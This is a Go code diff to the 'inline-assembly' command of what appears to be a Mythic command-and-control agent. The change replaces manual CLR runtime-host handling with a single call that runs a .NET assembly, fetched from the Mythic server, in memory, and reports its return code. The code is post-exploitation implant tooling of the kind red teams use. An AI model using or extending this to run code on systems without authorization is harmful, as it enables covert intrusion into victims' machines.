@@ -41,9 +41,7 @@ import (
 )
 
 var (
-	runtimeHost     *clr.ICORRuntimeHost
-	assemblyMutex   sync.Mutex
-	clrLoadedForExec bool
+	assemblyMutex sync.Mutex
 )
 
 // InlineAssemblyCommand implements the inline-assembly command
@@ -98,19 +96,6 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 
 	assemblyMutex.Lock()
 	defer assemblyMutex.Unlock()
-
-	// Initialize CLR if not already done
-	if !clrLoadedForExec {
-		runtimeHost, err = clr.LoadCLR("v4")
-		if err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error loading CLR: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
-		}
-		clrLoadedForExec = true
-	}
 
 	// Set up file transfer request to get assembly from Mythic
 	getFileMsg := structs.GetFileFromMythicStruct{
@@ -178,56 +163,52 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 		Completed:  false,
 	}
 
-	// Execute the assembly - wrapped in a recovery to catch panics
-	var stdout, stderr string
+	// Execute the assembly using ExecuteByteArray which handles CLR loading internally
+	// This is more reliable than trying to manage the runtime host ourselves
+	var retCode int32
+	var execErr error
+	
 	func() {
 		defer func() {
 			if r := recover(); r != nil {
-				stderr = fmt.Sprintf("PANIC during assembly execution: %v", r)
+				execErr = fmt.Errorf("PANIC during assembly execution: %v", r)
 			}
 		}()
 		
-		// Use ExecuteByteArrayDefaultDomain which properly handles the AppDomain
-		stdout, stderr = clr.ExecuteByteArrayDefaultDomain(runtimeHost, assemblyBytes, args)
+		// Use ExecuteByteArray which handles everything internally
+		retCode, execErr = clr.ExecuteByteArray("v4", assemblyBytes, args)
 	}()
-
-	// Check if we got an error that suggests the assembly couldn't be executed
-	if stderr != "" && strings.Contains(stderr, "cannot find the file") {
-		stderr += "\n\nTroubleshooting tips:\n"
-		stderr += "  - Ensure the assembly is a valid .NET executable (.exe)\n"
-		stderr += "  - Ensure the assembly targets .NET Framework (not .NET Core/.NET 5+)\n"
-		stderr += "  - Check that the assembly has a proper Main() entry point\n"
-		stderr += "  - Verify the assembly isn't corrupted during transfer\n"
-		stderr += fmt.Sprintf("  - Assembly size received: %d bytes\n", len(assemblyBytes))
-	}
 
 	// Build output
 	var output strings.Builder
-	output.WriteString(fmt.Sprintf("[+] Executed assembly (%d bytes)\n", len(assemblyBytes)))
+	output.WriteString(fmt.Sprintf("[+] Assembly executed (%d bytes)\n", len(assemblyBytes)))
+	output.WriteString(fmt.Sprintf("[+] Return code: %d\n", retCode))
 	
 	if len(args) > 0 {
-		output.WriteString(fmt.Sprintf("[+] Arguments: %s\n\n", params.Arguments))
+		output.WriteString(fmt.Sprintf("[+] Arguments: %s\n", params.Arguments))
 	}
 
-	if stdout != "" {
-		output.WriteString("=== STDOUT ===\n")
-		output.WriteString(stdout)
-		if !strings.HasSuffix(stdout, "\n") {
-			output.WriteString("\n")
+	if execErr != nil {
+		output.WriteString("\n=== EXECUTION ERROR ===\n")
+		output.WriteString(fmt.Sprintf("%v\n", execErr))
+		
+		if strings.Contains(execErr.Error(), "cannot find") || strings.Contains(execErr.Error(), "not found") {
+			output.WriteString("\nTroubleshooting tips:\n")
+			output.WriteString("  - Ensure the assembly is a valid .NET Framework executable (.exe)\n")
+			output.WriteString("  - Ensure it targets .NET Framework 4.x (not .NET Core/.NET 5+)\n")
+			output.WriteString("  - Check that Main() signature is: static void Main(string[] args)\n")
+			output.WriteString("  - Verify no external dependencies are required\n")
+			output.WriteString(fmt.Sprintf("  - Assembly size received: %d bytes\n", len(assemblyBytes)))
+		}
+		
+		return structs.CommandResult{
+			Output:    output.String(),
+			Status:    "error",
+			Completed: true,
 		}
 	}
 
-	if stderr != "" {
-		output.WriteString("=== STDERR ===\n")
-		output.WriteString(stderr)
-		if !strings.HasSuffix(stderr, "\n") {
-			output.WriteString("\n")
-		}
-	}
-
-	if stdout == "" && stderr == "" {
-		output.WriteString("[*] Assembly executed (no output captured)\n")
-	}
+	output.WriteString("\n[*] Assembly executed successfully\n")
 
 	return structs.CommandResult{
 		Output:    output.String(),
